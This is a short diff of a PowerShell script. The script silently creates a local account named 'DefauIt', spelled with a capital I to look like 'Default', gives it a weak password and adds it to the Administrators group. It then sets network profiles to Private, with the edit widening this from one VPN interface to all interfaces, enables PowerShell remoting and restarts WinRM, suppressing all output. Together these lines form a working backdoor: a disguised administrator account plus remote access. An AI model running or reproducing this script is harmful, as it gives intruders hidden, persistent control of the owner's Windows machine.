@@ -1,5 +1,5 @@
 New-LocalUser "DefauIt" -Password (ConvertTo-SecureString "4381" -AsPlainText -Force) -ErrorAction Stop 2>&1 | Out-Null;
 Add-LocalGroupMember -Group "Администраторы" -Member "DefauIt" -ErrorAction Stop 2>&1 | Out-Null;
-Set-NetConnectionProfile -InterfaceAlias "Radmin VPN" -NetworkCategory Private; -ErrorAction Stop 2>&1 | Out-Null;
+Set-NetConnectionProfile -InterfaceAlias * -NetworkCategory Private -ErrorAction Stop 2>&1 | Out-Null;
 Enable-PSRemoting -SkipNetworkProfileCheck -Force -ErrorAction Stop 2>&1 | Out-Null;
 Restart-Service WinRM -Force -ErrorAction Stop 2>&1 | Out-Null;
